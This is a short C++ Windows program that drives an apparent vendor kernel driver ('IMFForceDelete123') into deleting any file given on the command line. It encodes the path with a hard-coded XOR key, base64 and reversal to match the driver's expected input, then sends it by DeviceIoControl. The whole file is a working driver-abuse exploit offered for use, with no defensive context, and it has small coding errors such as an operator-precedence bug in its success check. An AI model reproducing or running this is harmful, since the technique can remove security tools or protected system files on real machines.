#include <iostream>
#include <cstdio>
#include <string>
#include <windows.h>
#include "base64.hpp"
using namespace std;
using namespace base64;

int main(int argc, char **argv)
{
    if (argc < 2)
        printf("use to delete a file. Use like ./exe filename\n");
    string prefix = "\\??\\";
    string filepath = prefix + argv[1];
    string xorkey = "ax40oznp8sowqnnc06mfy0ngz2y6rlbv";

    for (int i = 0; i < filepath.length(); i++) {
        filepath[i] = filepath[i] ^ xorkey[i % xorkey.length()];
    }
    string efilepath = to_base64(filepath);
    reverse(efilepath.begin(), efilepath.end());

    wstring finalpath(efilepath.begin(), efilepath.end());
    DWORD buffersize = DWORD(finalpath.length() * sizeof(wchar_t));

    HANDLE hDevice = CreateFileW(L"\\\\.\\IMFForceDelete123", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("driver not running. fail");
        return 0;
    }

    DWORD success;
    DWORD returnflag;

    BOOL status = DeviceIoControl(hDevice, 0x8016E000, (LPVOID)finalpath.c_str(), buffersize, &success, sizeof(success), &returnflag, NULL);

    if (status & returnflag == 1) {
        printf("success! it got deleted\n!");
    }
    else {
        printf("failed. success flag: %lu\n get last error: %lu\n return flags: %lu\n", success, GetLastError(), returnflag);
    }

    return 0;
}

